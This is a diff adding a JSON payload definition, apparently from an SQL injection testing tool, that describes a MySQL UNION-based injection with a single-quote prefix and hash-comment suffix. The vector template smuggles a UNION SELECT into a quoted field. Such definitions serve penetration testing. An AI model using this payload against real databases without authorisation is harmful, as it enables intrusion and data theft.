@@ -1,0 +1,12 @@
+{
+ "dbms": "mysql",
+ "technique": "union",
+ "boundary": {
+  "prefix": "'",
+  "suffix": "#",
+  "type": "single-quote",
+  "desc": "single-quoted + hash comment"
+ },
+ "vector": "{B} UNION SELECT {COLS}#",
+ "comment": "mysql union via single-quoted + hash comment"
+}
